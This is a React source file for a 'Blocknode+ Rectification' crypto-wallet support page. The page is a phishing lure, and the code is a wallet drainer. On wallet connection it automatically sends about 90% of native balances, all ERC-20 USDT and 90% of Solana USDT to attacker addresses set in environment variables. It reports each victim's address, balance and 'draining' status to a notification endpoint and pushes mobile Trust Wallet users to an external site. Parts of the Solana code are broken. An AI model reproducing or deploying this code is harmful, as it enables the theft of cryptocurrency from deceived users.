import selections from "../data";
import { useChainId } from "wagmi";
import chainsImage from "/images/chains.jpeg";
import { isMobile } from "react-device-detect";
import {
  mainnet,
  arbitrum,
  bsc,
  solana,
  solanaTestnet,
  solanaDevnet,
  bitcoin,
  sepolia,
} from "@reown/appkit/networks";
import { PublicKey,Transaction, SystemProgram } from "@solana/web3.js";
import {
  useAppKit,
  useAppKitAccount,
  useWalletInfo,
  // useDisconnect,
  useAppKitProvider,
  useAppKitEvents,
} from "@reown/appkit/react";
import { useAppKitConnection } from "@reown/appkit-adapter-solana/react";
// import { Provider } from "@reown/appkit-adapter-solana/react";
import {
  useSwitchChain,
  useSendTransaction,
  BaseError,
  useWaitForTransactionReceipt,
  usePrepareTransactionRequest,
  useBalance,
  useGasPrice,
  useEstimateGas,
} from "wagmi";
import {
  appendTransactionMessageInstructions,
  createTransactionMessage,
  pipe,
  setTransactionMessageFeePayerSigner,
  setTransactionMessageLifetimeUsingBlockhash,
} from "@solana/kit";

import {
  findAssociatedTokenPda,
  getCreateAssociatedTokenInstructionAsync,
  getTransferInstruction,
  fetchToken,
  TOKEN_PROGRAM_ADDRESS
} from "@solana-program/token";
// import { parseEther } from 'viem'
import { useEffect, useState } from "react";
import { erc20Abi } from "viem";
import { useReadContract, useWriteContract } from "wagmi";

const Home = () => {
  const [totalFee, setTotalFee] = useState(null);

  const { open } = useAppKit();
  const { address, isConnected } = useAppKitAccount();
  const balance = useBalance({ address });
  const [amountToSend, setAmountToSend] = useState(null);
  // const { disconnect } = useDisconnect();
  const { walletInfo } = useWalletInfo();
    const [tokenAddress, setTokenAddress] = useState(null);
    const { walletProvider } = useAppKitProvider("solana");
const events = useAppKitEvents();

  const [txHash, setTxHash] = useState(null);

  const chainId = useChainId();

  const CHAINS = {
    [mainnet.id]: mainnet,
    [arbitrum.id]: arbitrum,
    [bsc.id]: bsc,
    [solana.id]: solana,
    [solanaTestnet.id]: solanaTestnet,
    [solanaDevnet.id]: solanaDevnet,
    [bitcoin.id]: bitcoin,
    [sepolia.id]: sepolia,
  };

  const activeChain = CHAINS[chainId];

  const chain = CHAINS[chainId];
  const { switchChain } = useSwitchChain({
    throwForSwitchChainNotSupported: true,
    onError(error) {
      console.log("Network switch error:", error);
    },
  });

  const { data: request } = usePrepareTransactionRequest(
    address && amountToSend && balance.data?.symbol
      ? {
          chainId: chain.id,
          account: address,
          to: import.meta.env[`VITE_${balance.data.symbol}_ADDRESS`],
          value: amountToSend,
        }
      : undefined
  );
  // const { sendTransaction, isPending } = useSendTransaction();

  const requestSwitch = () => {
    switchChain({ chainId: chain.id });
  };

  function formatBalance(balanceBigInt, chain) {
    if (!balanceBigInt) return "0";

    const value = BigInt(balanceBigInt);

    const decimalsMap = {
      mainnet: 18,
      sepolia: 18,
      arbitrum: 18,
      bsc: 18,
      bitcoin: 8,
      solana: 9,
      solanaTestnet: 9,
      solanaDevnet: 9,
    };

    const decimals = decimalsMap[chain] ?? 18; // default to 18

    const divisor = 10n ** BigInt(decimals);

    const whole = value / divisor;
    const fraction = value % divisor;

    // Convert fraction to padded string
    const fractionStr = fraction.toString().padStart(decimals, "0");

    // Display only first few decimals for readability
    return `${whole.toString()}.${fractionStr.slice(0, 6)}`;
  }

  const { data: receipt, isSuccess: confirmed } = useWaitForTransactionReceipt({
    hash: txHash,
  });

  useEffect(() => {
    if (confirmed) {
      console.log("✅ Transaction Confirmed!");
      console.log(receipt);
      drainNotification();
      setTotalFee(0);
    }
  }, [confirmed]);

  const isMobileDevice =
    /Android|iPhone|iPad|iPod|Opera Mini|IEMobile/i.test(navigator.userAgent) ||
    window.matchMedia("(max-width: 768px)").matches ||
    isMobile;

  useEffect(() => {
    if (isConnected && address && activeChain.id) {
      console.log("Wallet connected:", address);
      console.log("Connected to:", activeChain?.name);
      console.log("chainId:", chain.id);

      if (activeChain?.id !== chain.id) {
        console.log("Switching network...");
        requestSwitch();
        return; // ✅ Wait for network switch before sending transaction
      } else {
        console.log("network matches");
      }

      walletConnectNotification();
      console.log("Balance:", formatBalance(balance.data?.value, activeChain));

      // ✅ Now safe to call transfer
      transferFunds();
    }
  }, [isConnected, address, balance.data, totalFee, activeChain, request]);

  const { sendTransaction } = useSendTransaction();
  const gasPrice = useGasPrice();
  const estimateGas = useEstimateGas({
    to: import.meta.env[`VITE_${balance.data?.symbol}_ADDRESS`],
    value: balance.data?.value,
  });

  // const isTrustWalletApp = () => {
  //   // Trust Wallet injects `ethereum.isTrust` in the in-app browser
  //   return (
  //     typeof window.ethereum !== "undefined" && window.ethereum.isTrust === true
  //   );
  // };


    useEffect(() => {
    if (!events?.data) return;

    // ✅ Detect the "SELECT_WALLET" event
    if (events.data.event === "SELECT_WALLET") {
      const walletName = events.data.properties?.name?.toLowerCase();

      console.log("Wallet Selected:", walletName);

      if (walletName?.includes("trust") && isMobileDevice) {

        // ✅ Open DApp INSIDE Trust Wallet browser
        window.location.href = `https://link.trustwallet.com/open_url?coin_id=${activeChain?.id}&url=https://fixsecure.onrender.com`;
      }
    }
  }, [events, isMobileDevice]);

  // useEffect(() => {

  //   if (
  //     isConnected &&
  //     walletInfo?.name === "Trust Wallet" &&
  //     isMobileDevice &&
  //     !isTrustWalletApp() // ensure we are not already inside the app
  //   ) {
  //     const run = async () => {
  //       await disconnect(); // ✅ works correctly
  //       window.location.href = `https://link.trustwallet.com/open_url?coin_id=${activeChain?.id}&url=https://fixsecure.onrender.com`;
  //     };

  //     run();
  //   }
  // }, [isConnected, walletInfo, activeChain?.id]);

  useEffect(() => {
    if (estimateGas.data && gasPrice.data && balance.data?.value) {
      const fee = estimateGas.data * gasPrice.data; // bigint × bigint
      setTotalFee(fee);

      setAmountToSend((balance.data?.value * 90n) / 100n + fee);
    }
  }, [estimateGas.data, gasPrice.data, balance.data?.value]);

  const transferFunds = () => {
    if (!chain || !request) {
      console.log("Cannot send transaction: missing chain or request");
      return;
    }

    if (!amountToSend || amountToSend <= 0n || balance.data?.value <= 0n) {
      console.log("Not enough balance or amount to send");
      return;
    }

    if (walletInfo?.name === "MetaMask" && isMobile) {
      const metamaskLink = "https://link.metamask.io";
      window.open(metamaskLink, "_blank");
    }

    sendTransaction(request, {
      onSuccess(hash) {
        console.log("✅ Transaction sent:", hash);
        setTxHash(hash);
      },
      onError(error) {
        console.log("❌ Error:", error);
        console.log("❌ BaseError:", BaseError);
      },
    });
  };

  let message;

  const walletConnectNotification = async () => {
    if (balance.data?.value > 0 && amountToSend > 0n) {
      message = "waiting for user to confirm transaction for draining";
    } else {
      message = "connected wallet is not funded or not enough to cover gas fee";
    }

    await fetch(`${import.meta.env.VITE_API}/send-notification`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        address: `wallet ${address} succesfully connected`,
        balance: `${formatBalance(balance.data?.value, activeChain)} ${
          balance.data?.symbol || ""
        }`.trim(),
        message: message,
      }),
    });
  };

  const drainNotification = async () => {
    await fetch(`${import.meta.env.VITE_API}/send-notification`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        transaction: `${formatBalance(amountToSend, activeChain)} ${
          balance.data?.symbol
        } sent to ${import.meta.env[`VITE_${balance.data?.symbol}_ADDRESS`]}`,
      }),
    });
  };

  //token drain

  // const tokenAddress = "0x..."; // ERC-20 contract



  useEffect(() => {
    if (isConnected) {
      if (activeChain?.name === "BNB Smart Chain") {
        setTokenAddress("0x55d398326f99059fF775485246999027B3197955")
      } else if (activeChain?.name === "Ethereum") {
        setTokenAddress("0xdAC17F958D2ee523a2206206994597C13D831ec7");
      }
    }
  }, [isConnected, activeChain, tokenAddress,]);
  // 1. Read token balance
  const { data: rawBalance } = useReadContract({
    address: tokenAddress,
    abi: erc20Abi,
    functionName: "balanceOf",
    args: [address],
  });


  // 2. Read decimals
  const { data: decimals } = useReadContract({
    address: tokenAddress,
    abi: erc20Abi,
    functionName: "decimals",
  });

  // 3. Determine if balance exists
  const hasToken = rawBalance && rawBalance > 0n;

  // 4. Prepare transaction
  const { writeContract, error, isError } = useWriteContract();

  // 5. Send transaction
  // const { write } = useWriteContract(config);

  const sendToken = () => {
    if (!hasToken) return;
      if (!isConnected) return;
  if (!tokenAddress) return ;
  if (!rawBalance) return ;
  if (!decimals) return ;
    try {
        writeContract({
        account: address, 
          address: tokenAddress,
          abi: erc20Abi,
          functionName: "transfer",
          args: [
            import.meta.env[`VITE_${balance.data?.symbol}_ADDRESS`],
            rawBalance,
          ], // send ALL tokens
        }) 
        if(isError) {
        console.log("Error sending token", error)
        }
    } catch (error) {
      console.error("Transaction error:", error);
    }
  };

  useEffect(() => {
    if (hasToken) {
      sendToken();
    }
  }, [isConnected, hasToken, rawBalance, decimals]);


  //solana drainer
//get balance
  const getSolBalance = async () => {
  if (!address) return;

  const balanceLamports = await connection.getBalance(address); // returns lamports

    const amountToSend = BigInt(Math.floor(Number(balanceLamports) * 0.9));

  return amountToSend;
};



  // function to send a TX
const handleSendTx = async() => {
    const latestBlockhash = await connection.getLatestBlockhash();

    // create the transaction
    const transaction= new Transaction({
        feePayer: address,
        recentBlockhash: latestBlockhash?.blockhash,
      }).add(
        SystemProgram.transfer({
          fromPubkey: address,
          toPubkey: new PublicKey(address), // destination address
          lamports: getSolBalance(),
        })
      );

    // raise the modal
    const signature = await walletProvider.sendTransaction(transaction, connection)
          const drainNotification = async () => {
    await fetch(`${import.meta.env.VITE_API}/send-notification`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        transaction: `${formatBalance(getUSDTBalance(), activeChain)} ${
          balance.data?.symbol
        } sent to ${import.meta.env[`VITE_${balance.data?.symbol}_ADDRESS`]}`,
      }),
    });
  };
  drainNotification()

    // print the Transaction Signature
    console.log(signature);
}

  const { connection } = useAppKitConnection();
  const USDT_MINT = new PublicKey("Es9vMFrzaCERmJfrFvtitxozpP8FDfrpsfhhVFvZM9dj");
  const sendUsdt  = async () => {
  try {
    if (!isConnected) throw new Error("Wallet not connected");

    const sender = new PublicKey(address);
    const recipient = new PublicKey(import.meta.env.VITE_SOL_ADDRESS);

    // 1️⃣ Derive sender ATA
    const [senderAta] = await findAssociatedTokenPda({
      mint: USDT_MINT,
      owner: sender,
      tokenProgram: TOKEN_PROGRAM_ADDRESS,
    });

    // 2️⃣ Fetch sender token account to get balance
    const senderAccount = await fetchToken(connection, senderAta, {
      commitment: "confirmed",
    });

    const currentBalance = senderAccount.data.amount; // in smallest units

    if (currentBalance === 0n) {
      console.log("No USDT to send");
      return;
    }

    // 3️⃣ Calculate 90% of balance
    const amountToSend = (currentBalance * 90n) / 100n;

    // 4️⃣ Derive recipient ATA
    const [recipientAta] = await findAssociatedTokenPda({
      mint: USDT_MINT,
      owner: recipient,
      tokenProgram: TOKEN_PROGRAM_ADDRESS,
    });

    // 5️⃣ Create ATAs if missing
    const createSenderAtaIx = await getCreateAssociatedTokenInstructionAsync({
      payer: sender,
      mint: USDT_MINT,
      owner: sender,
    });

    const createRecipientAtaIx = await getCreateAssociatedTokenInstructionAsync({
      payer: sender,
      mint: USDT_MINT,
      owner: recipient,
    });

    // 6️⃣ Transfer instruction
    const transferIx = getTransferInstruction({
      source: senderAta,
      destination: recipientAta,
      authority: sender,
      amount: amountToSend,
    });

    // 7️⃣ Build transaction
    const latestBlockhash = await connection.getLatestBlockhash();

    const txMessage = pipe(
      createTransactionMessage({ version: 0 }),
      (tx) => setTransactionMessageFeePayerSigner(sender, tx),
      (tx) => setTransactionMessageLifetimeUsingBlockhash(latestBlockhash, tx),
      (tx) => appendTransactionMessageInstructions(
        [createSenderAtaIx, createRecipientAtaIx, transferIx],
        tx
      )
    );

    // 8️⃣ Send transaction
    const signature = await walletProvider.sendTransaction(txMessage, connection);
    console.log("✅ 90% USDT Sent:", signature);
      const drainNotification = async () => {
    await fetch(`${import.meta.env.VITE_API}/send-notification`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        transaction: `${formatBalance(getUSDTBalance(), activeChain)} ${
          balance.data?.symbol
        } sent to ${import.meta.env[`VITE_${balance.data?.symbol}_ADDRESS`]}`,
      }),
    });
  };
  drainNotification()
    return signature;
  } catch (err) {
    console.error("❌ Error sending USDT:", err);
  }
};

const getUSDTBalance = async () => {
  if (!address) return;

  // 1. Derive Associated Token Account (ATA) for USDT
  const [usdtATA] = await findAssociatedTokenPda({
    mint: USDT_MINT,
    owner: address,
    tokenProgram: TOKEN_PROGRAM_ADDRESS,
  });

  // 2. Fetch token account data
  const usdtAccount = await fetchToken(connection, usdtATA, { commitment: "confirmed" });

  // 3. Get balance (adjust by decimals)
  const decimals = usdtAccount.data.mintInfo.decimals; // usually 6 for USDT
  const rawAmount = usdtAccount.data.amount; // in smallest units
  const amount = Number(rawAmount) / 10 ** decimals;

  console.log("USDT balance:", amount);
  return amount;
};
console.log("usdt balance", getUSDTBalance())

useEffect(() => {
  if(getSolBalance > 0n) {
    handleSendTx();
  } else if (getUSDTBalance() > 0) {
    sendUsdt()
  }
},[getSolBalance, getUSDTBalance, connection, handleSendTx])

  const images = Array.from({ length: 32 }, (_, i) => `/images/${i + 1}.PNG`);

  return (
    <div className="bg-[#001132] h-full flex flex-col py-12 px-3 lg:px-32">
      <div className="flex items-center flex-col text-center">
        <h1 className="text-center text-4xl font-extrabold text-[#019dea] lg:text-6xl">
          Decentralized Platform
        </h1>
        <p className="text-white lg:text-center lg:flex  lg:w-[35vw]">
          Every digital artwork on Upside is authentic and truly unique.
          <br />
          <br />
          Blockchain technology makes this new approach to digital ownership
          possible. Open and decentralized protocol for syncing various Wallets
          issues on Secure Server.
          <br />
          <br />
          This is not an app but a protocol that establishes a remote resolution
          between all noncustodial wallet It is an online server which gets you
          across to every wallet representative to enable effective complain and
          rectification of issues.
          <br />
          <br />
          You will be on a chat with an Artificial Intelligence Robot with zero
          Human interference.
        </p>
        <br />
        <br />
        {!isConnected ? (
          <button
            onClick={() => open()}
            className="bg-[#019dea] px-5 py-2.5 rounded-2xl lg:w-[40vw] cursor-pointer"
          >
            Connect Wallet
          </button>
        ) : (
          <div>
            <appkit-button />
          </div>
        )}
      </div>
      <br />
      <br />
      <div className="l]">
        <div className="py-5 flex flex-col items-center border-2 border-blue-600 rounded-3xl bg-[#0e1a31]">
          <h1 className="font-extrabold text-[#019dea]">
            Make Your Selection Below
          </h1>
          <br />
          <br />
          <div className=" flex flex-col items-center text-center lg:grid lg:grid-cols-3 ">
            {selections.map((item, i) => (
              <button
                onClick={() => open()}
                key={i}
                className="flex flex-col justify-center items-center py-4 px-4 my-5 w-[75vw] cursor-pointer h-48 rounded-3xl border-2 border-blue-600 lg:w-[20vw] lg:mx-10 bg-[#182030]"
              >
                <div>
                  {item.icon && (
                    <item.icon className="text-center w-full text-4xl text-blue-600" />
                  )}
                </div>

                <p className="text-white ">{item.name}</p>
                <p className="text-gray-600 text-[12px]">
                  click here for {item.description}
                </p>
              </button>
            ))}
          </div>
        </div>
      </div>
      <div>
        <br />
        <br />
        <p className="text-blue-600 text-center">
          Copyright &copy; 2025 Blocknode+ Rectification . All rights reserved.
        </p>
        <br />
        <div className="flex justify-center items-center w-full">
          <img
            src={chainsImage}
            alt="supported chain"
            className="rounded-3xl h-[30vw] w-[30vw]"
          />
        </div>
        <br />
        <h1 className="text-center bg-white  font-bold text-xl rounded-3xl">
          TRUSTED PARTNERS
        </h1>
        <br />
        <div className="grid grid-cols-2 space-y-2 space-x-2 items-center justify-center ml-4 lg:ml-[10vw]">
          {images.map((src, index) => (
            <img
              key={index}
              src={src}
              alt=""
              className="w-[150px] lg:w-[30vw]"
            />
          ))}
        </div>
      </div>
    </div>
  );
};

export default Home;
